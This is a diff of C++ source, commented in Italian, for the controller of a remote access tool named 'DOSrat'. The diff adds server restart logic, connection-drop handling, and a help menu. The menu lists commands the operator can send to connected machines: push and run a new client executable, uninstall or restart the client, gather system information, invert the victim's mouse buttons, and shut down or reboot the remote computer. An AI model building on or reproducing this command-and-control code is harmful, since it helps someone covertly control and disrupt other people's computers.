@@ -94,9 +94,12 @@ void VerificaAggiornamenti(bool AutoUpdate)
 void AccettaConnessioni(TcpIP& Server)
 {
     int c = 0;
-    
+
     while (true)
     {
+        if (!ServerLoopController)
+            break;
+
         for (int i = 0; i < MAX_CLIENTS; i++)
         {
             if (!Clients[i].IsConnected)
@@ -106,24 +109,38 @@ void AccettaConnessioni(TcpIP& Server)
             }
         }
 
-        if (Server.WaitConn(Clients[c].sock))
+        if (Server.WaitConn(Clients[c].sock, 1000))
             COMUNICAZIONI::Inizializzazione(c, Clients[c].sock);
     }
+
+    return;
 }
 
 void VerificaConnessioni()
 {
     while (true)
     {
+        if (!ServerLoopController)
+            break;
+
         for (int i = 0; i < MAX_CLIENTS; i++)
         {
+            if (!ServerLoopController)
+                break;
+
             if (Clients[i].IsConnected && !Clients[i].InTask)
             {
                 char garbage;
                 TcpIP::SetTimeout(100, Clients[i].sock);
-                if (recv(Clients[i].sock, &garbage, 1, MSG_PEEK) == SOCKET_ERROR)
+
+                int Res = recv(Clients[i].sock, &garbage, 1, MSG_PEEK);
+
+                if (Res == SOCKET_ERROR || Res == 0)
                 {
-                    if (WSAGetLastError() == 10054)
+                    Res = WSAGetLastError();
+                    //cout << "WSA " << Res << endl;
+
+                    if (Res == 10054 || Res == 0)
                     {
                         closesocket(Clients[i].sock);
                         Clients[i].IsConnected = false;
@@ -134,6 +151,8 @@ void VerificaConnessioni()
             }
         }
     }
+
+    return;
 }
 
 bool CheckConnection(SOCKET Sock, int ID)
@@ -160,6 +179,39 @@ bool CheckConnection(SOCKET Sock, int ID)
     Sleep(2000);
     return false;
 }
+
+bool RestartServer(TcpIP &Server, int Port)
+{
+    ServerLoopController = false;
+
+    Sleep(1000);
+
+    for (int i = 0; i < MAX_CLIENTS; i++)
+        if (Clients[i].IsConnected)
+        {
+            closesocket(Clients[i].sock);
+            Clients[i].IsConnected = false;
+        }
+
+    Server.Stop();
+    Server.Port = Port;
+    if (Server.StartServer() != 0)
+        return false;
+
+    Sleep(1000);
+    Clu->AggiornaTitolo();
+
+    ServerLoopController = true;
+
+    thread Aconn(AccettaConnessioni, ref(Server));
+    thread Vconn(VerificaConnessioni);
+    Aconn.detach();
+    Vconn.detach();
+
+    return true;
+}
+
+// ---------------[ COMANDI CLIENT ]---------------
 
 bool GetInfo(SOCKET Sock, int ID)
 {
@@ -301,8 +353,10 @@ short UpdateClient(SOCKET Sock, int ID)
     if (FilePath == "")
         return 1;
 
+    cout << "Invio file in corso..." << endl;
     if (COMUNICAZIONI::UpdateClient(Sock, du.GetBinaryFileContent(FilePath)))
     {
+        cout << "File inviato." << endl;
         Sleep(1000);
         closesocket(Sock);
         Clients[ID].IsConnected = false;
@@ -316,6 +370,20 @@ short UpdateClient(SOCKET Sock, int ID)
 bool Uninstall(SOCKET Sock, int ID)
 {
     if (COMUNICAZIONI::Uninstall(Sock))
+    {
+        Sleep(1000);
+        closesocket(Sock);
+        Clients[ID].IsConnected = false;
+        Clu->AggiornaTitolo();
+        return true;
+    }
+
+    return false;
+}
+
+bool RestartClient(SOCKET Sock, int ID)
+{
+    if (COMUNICAZIONI::RestartClient(Sock))
     {
         Sleep(1000);
         closesocket(Sock);
@@ -346,7 +414,28 @@ void Sessione(int ID, SOCKET Sock)
 
         Clients[ID].InTask = true;
 
-        if (cmd == "getinfo")
+        if (cmd == "help")
+        {
+            cout << "\t\tClient" << endl;
+            cout << "Reconnect - Forza il Client a scollegarsi e ricollegarsi a DOSrat ma senza riavviarlo." << endl;
+            cout << "Killclient / Kill - Termina il processo del Client." << endl;
+            cout << "Updateclient / Update - Aggiorna il Client scegliendo l'eseguibile tra i file locali, il Client si riavviera' con il file scelto." << endl;
+            cout << "Uninstall - Disinstalla il Client dal computer remoto." << endl;
+            cout << "Restartclient / Restart - Riavvia il Client terminando il processo e riavviandolo." << endl;
+            cout << endl;
+            cout << "\t\tSystem" << endl;
+            cout << "Getinfo - Ottieni informazioni sul computer remoto e sul Client." << endl;
+            cout << "Invertmouse - Inverte i tasti del mouse sul computer remoto." << endl;
+            cout << "Shutdown - Spegne il computer remoto." << endl;
+            cout << "Reboot - Riavvia il computer remoto." << endl;
+            cout << endl;
+            cout << "\t\tUtility" << endl;
+            cout << "Exit / Close - Torna al menu principale." << endl;
+            cout << "Clear / Cls - Pulisce la console da tutti i comandi precedenti." << endl;
+            cout << "Help - Mostra la lista dei comandi." << endl;
+            cout << endl;
+        }
+        else if (cmd == "getinfo")
         {
             if (!GetInfo(Sock, ID))
                 Controllo = CheckConnection(Sock, ID);
@@ -357,7 +446,9 @@ void Sessione(int ID, SOCKET Sock)
                 Controllo = CheckConnection(Sock, ID);
         }
         else if (cmd == "exit" || cmd == "close")
+        {
             Controllo = false;
+        }
         else if (cmd == "reconnect")
         {
             if (!Reconnect(Sock, ID))
@@ -392,7 +483,7 @@ void Sessione(int ID, SOCKET Sock)
             else
                 Controllo = false;
         }
-        else if (cmd == "updateclient")
+        else if (cmd == "updateclient" || cmd == "update")
         {
             switch (UpdateClient(Sock, ID))
             {
@@ -404,6 +495,13 @@ void Sessione(int ID, SOCKET Sock)
         else if (cmd == "uninstall")
         {
             if (!Uninstall(Sock, ID))
+                Controllo = CheckConnection(Sock, ID);
+            else
+                Controllo = false;
+        }
+        else if (cmd == "restartclient" || cmd == "restart")
+        {
+            if (!RestartClient(Sock, ID))
                 Controllo = CheckConnection(Sock, ID);
             else
                 Controllo = false;
